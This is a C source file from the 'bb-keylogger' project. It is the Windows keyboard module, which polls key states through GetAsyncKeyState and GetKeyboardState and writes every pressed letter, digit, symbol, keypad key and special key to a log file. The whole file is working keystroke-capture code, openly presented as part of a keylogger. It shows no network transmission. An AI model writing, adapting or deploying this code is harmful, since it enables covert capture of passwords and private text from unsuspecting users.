/* This file is part of bb-keylogger project.
*
* See the NOTICE file distributed with this work for copyright information.
*
* Licensed under the Apache License, Version 2.0 (the "License");
* you may not use this file except in compliance with the License.
* You may obtain a copy of the License at
*
* http://www.apache.org/licenses/LICENSE-2.0
*
* Unless required by applicable law or agreed to in writing, software
* distributed under the License is distributed on an "AS IS" BASIS,
* WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
* See the License for the specific language governing permissions and
* limitations under the License.
*/

/*
* File:   bb-keylogger-keyboard.c
* Author: Frapin Kevin
* Date:   31/03/2011
*
* DESCRIPTION
* -----------------------------------------------------------------------------
* File containing all the functions used to retrieve and log informations from 
* the keyboard.
* -----------------------------------------------------------------------------
*/

//---------------------------------------------------------------------- DEFINE
#define _WIN32_WINNT 0x0601

//------------------------------------------------------------- SYSTEM INCLUDES
#include <windows.h>

//---------------------------------------------------------- PERSONNAL INCLUDES
#include "includes/bb-keylogger-keyboard.h"
#include "includes/global.h"

//------------------------------------------------------------------- FUNCTIONS

void log_keystrokes( FILE * log_file )
{
	char keyboard_state [ BUFFER_SIZE_KB_STATE ];
	int success = GetKeyboardState( ( PBYTE ) &keyboard_state );
	if( success != 0 )
	// If it succeeds
	{
		log_alphabetic_keystrokes( log_file );
		log_numeric_keystrokes( log_file, keyboard_state );
		log_stream_keystrokes( log_file );
		log_mathematical_operators_keystrokes( log_file );
		log_others_keystrokes( log_file );	
		
	}
}

void log_alphabetic_keystrokes( FILE * log_file )
{
	// State of the special keys for capital letter
	int key_caps_lock = GetKeyState( VK_CAPITAL );// 0 or 1
	int key_shift = GetAsyncKeyState( VK_SHIFT ); // 0 or KEY_DOWN_STATE
	int is_cap = ( key_shift == KEY_DOWN_STATE ? 1 : 0 ) ^ key_caps_lock;
	
	// Check the state of the keys and log the pressed keys
	int i;
	for( i = VK_A; i <= VK_Z; i++ )
	{
		if( GetAsyncKeyState( i ) & KEY_PRESSED_STATE )
		{
			// Put the character in capital letter if necessary
			int ascii = ( is_cap ? i : ( i+32 ) );
			log_infos( log_file, "%c", ascii );
		}
	}
}

void log_mathematical_operators_keystrokes( FILE * log_file )
{
	int i;
	// Log the pressed mathematical operators keys
	for( i = 0; i < NB_VKS_MATH; i++ )
	{
		if( GetAsyncKeyState( VKS_MATH[i] ) & KEY_PRESSED_STATE )
		{
			log_infos( log_file, "%s", VKS_MATH_TXT[i] );
		}
	}
}

void log_numeric_keystrokes( FILE * log_file, char * keyboard_state )
{
	int i;
	// Log the pressed numeric keys, not on the keypad 
	// (These keys can also be special keys : @,$,...)
	for( i = VK_0; i <= VK_9; i++ )
	{
		if( GetAsyncKeyState( i ) & KEY_PRESSED_STATE )
		{
			int scan_code = MapVirtualKey( i, 0 );
			char ascii_char;
			// ToAscii returns a numeric key [0..9] or a special key : [@,$,%,...]
			if( ToAscii( i, scan_code, ( BYTE * ) keyboard_state, ( LPWORD ) &ascii_char, 0 ) == 1 )
			// If a character has been retrieved
			{
				log_infos( log_file, "%c", ascii_char );
			}
		}
	}
	
	// Log the pressed numeric keys, on the keypad
	for( i = VK_NUMPAD0; i <= VK_NUMPAD9; i++ )
	{
		if( GetAsyncKeyState( i ) & KEY_PRESSED_STATE )
		{
			log_infos( log_file, "%01d", i - VK_NUMPAD0 );
		}
	}
}

void log_others_keystrokes( FILE * log_file )
{
	int i;
	// Log the pressed keys considered important
	for( i = 0; i < NB_VKS_OTHERS; i++ )
	{
		if( GetAsyncKeyState( VKS_OTHERS[i] ) & KEY_PRESSED_STATE )
		{
			log_infos( log_file, "%s", VKS_OTHERS_TXT[i] );
		}
	}	
}

void log_stream_keystrokes( FILE * log_file )
{
	int i;
	// Log the pressed keys that alter the text stream
	for( i = 0; i < NB_VKS_ALTER_STREAM; i++ )
	{
		if( GetAsyncKeyState( VKS_ALTER_STREAM[i] ) & KEY_PRESSED_STATE )
		{
			log_infos( log_file, "\n%s", VKS_ALTER_STREAM_TXT[i] );
		}
	}
}
